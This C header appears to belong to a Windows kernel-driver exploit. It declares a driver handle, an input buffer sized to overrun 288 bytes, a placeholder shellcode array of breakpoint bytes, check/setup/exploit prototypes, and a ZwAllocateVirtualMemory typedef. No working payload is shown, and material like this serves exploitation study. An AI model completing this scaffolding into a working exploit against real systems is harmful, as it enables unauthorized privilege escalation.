#pragma once

#include <Windows.h>
#include <stdio.h>

HANDLE driver = 0, ntdll = 0;

char unused = 0;

char inBuffer[288 + 8] = { 0 };
char outBuffer[1024] = { 0 };
DWORD bytesReturned = 0;

char shellcode[] = {
	0xCC, 0xCC
};

int check();
int setup();
int exploit();

typedef NTSTATUS(*WINAPI ZwAllocateVirtualMemory)(
	HANDLE    ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T   RegionSize,
	ULONG     AllocationType,
	ULONG     Protect
	);